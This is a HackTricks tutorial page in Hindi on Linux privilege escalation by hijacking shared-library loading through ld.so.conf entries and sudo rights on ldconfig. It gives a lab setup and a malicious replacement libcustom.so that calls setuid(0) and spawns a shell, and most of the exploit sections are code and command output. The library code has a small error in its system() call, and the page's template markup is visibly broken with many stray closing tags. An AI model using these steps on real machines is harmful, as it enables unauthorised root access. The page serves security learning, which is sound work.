# ld.so privesc exploit example

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}

## वातावरण तैयार करें

अगले अनुभाग में आप उन फ़ाइलों का कोड पा सकते हैं जिनका हम वातावरण तैयार करने के लिए उपयोग करने जा रहे हैं

{% tabs %}
{% tab title="sharedvuln.c" %}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{% endtab %}

{% tab title="libcustom.h" %}
```c
#include <stdio.h>

void vuln_func();
```
{% endtab %}

{% tab title="libcustom.c" %}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{% endtab %}
{% endtabs %}

1. **अपने मशीन में उसी फ़ोल्डर में** उन फ़ाइलों को **बनाएँ**
2. **लाइब्रेरी को** संकलित करें: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. `libcustom.so` को `/usr/lib` में **कॉपी करें**: `sudo cp libcustom.so /usr/lib` (रूट प्रिविलेज)
4. **कार्यकारी फ़ाइल को** संकलित करें: `gcc sharedvuln.c -o sharedvuln -lcustom`

### वातावरण की जाँच करें

जाँच करें कि _libcustom.so_ _/usr/lib_ से **लोड** हो रहा है और कि आप बाइनरी को **निष्पादित** कर सकते हैं।
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
## Exploit

इस परिदृश्य में हम यह मानने जा रहे हैं कि **किसी ने _/etc/ld.so.conf/_ के अंदर एक कमजोर प्रविष्टि बनाई है**:
```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```
The vulnerable folder is _/home/ubuntu/lib_ (जहाँ हमारे पास लिखने की अनुमति है)।\
**डाउनलोड और संकलित करें** निम्नलिखित कोड उस पथ के अंदर:
```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```
अब जब हमने **गलत कॉन्फ़िगर की गई** पथ के अंदर **दुष्ट libcustom पुस्तकालय** बनाया है, हमें **रीबूट** का इंतज़ार करना होगा या रूट उपयोगकर्ता को **`ldconfig`** निष्पादित करने के लिए कहना होगा (_यदि आप इस बाइनरी को **sudo** के रूप में निष्पादित कर सकते हैं या इसमें **suid बिट** है, तो आप इसे स्वयं निष्पादित कर सकेंगे_)।

एक बार जब यह हो जाता है, तो **फिर से जांचें** कि `sharevuln` निष्पादन योग्य `libcustom.so` पुस्तकालय को कहाँ से लोड कर रहा है:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
जैसा कि आप देख सकते हैं, यह **`/home/ubuntu/lib` से लोड हो रहा है** और यदि कोई उपयोगकर्ता इसे निष्पादित करता है, तो एक शेल निष्पादित होगा:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
{% hint style="info" %}
ध्यान दें कि इस उदाहरण में हमने विशेषाधिकारों को बढ़ाया नहीं है, लेकिन निष्पादित किए गए आदेशों को संशोधित करके और **जड़ या अन्य विशेषाधिकार प्राप्त उपयोगकर्ता के द्वारा कमजोर बाइनरी को निष्पादित करने की प्रतीक्षा करके** हम विशेषाधिकार बढ़ा सकेंगे।
{% endhint %}

### अन्य गलत कॉन्फ़िगरेशन - समान कमजोरियां

पिछले उदाहरण में हमने एक गलत कॉन्फ़िगरेशन का नाटक किया जहां एक व्यवस्थापक ने **`/etc/ld.so.conf.d/` के अंदर एक कॉन्फ़िगरेशन फ़ाइल के अंदर एक गैर-विशेषाधिकार प्राप्त फ़ोल्डर सेट किया**।\
लेकिन अन्य गलत कॉन्फ़िगरेशन भी हैं जो समान कमजोरियों का कारण बन सकते हैं, यदि आपके पास **`/etc/ld.so.conf.d` के अंदर कुछ **config file** में लिखने की अनुमति है, `/etc/ld.so.conf.d` फ़ोल्डर में या `/etc/ld.so.conf` फ़ाइल में, तो आप समान कमजोरी को कॉन्फ़िगर कर सकते हैं और इसका लाभ उठा सकते हैं।

## एक्सप्लॉइट 2

**मान लीजिए कि आपके पास `ldconfig` पर sudo विशेषाधिकार हैं**।\
आप `ldconfig` को **कॉन्फ़ फ़ाइलों को कहाँ से लोड करना है** यह बता सकते हैं, इसलिए हम इसका लाभ उठाकर `ldconfig` को मनमाने फ़ोल्डर लोड करने के लिए कह सकते हैं।\
तो, चलिए "/tmp" को लोड करने के लिए आवश्यक फ़ाइलें और फ़ोल्डर बनाते हैं:
```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
अब, जैसा कि **पिछले एक्सप्लॉइट** में संकेत दिया गया है, **`/tmp` के अंदर दुर्भावनापूर्ण लाइब्रेरी बनाएं**।\
और अंत में, चलिए पथ लोड करते हैं और जांचते हैं कि बाइनरी लाइब्रेरी को कहाँ से लोड कर रही है:
```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**जैसा कि आप देख सकते हैं, `ldconfig` पर sudo विशेषाधिकार होने से आप उसी कमजोरियों का लाभ उठा सकते हैं।**

{% hint style="info" %}
{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
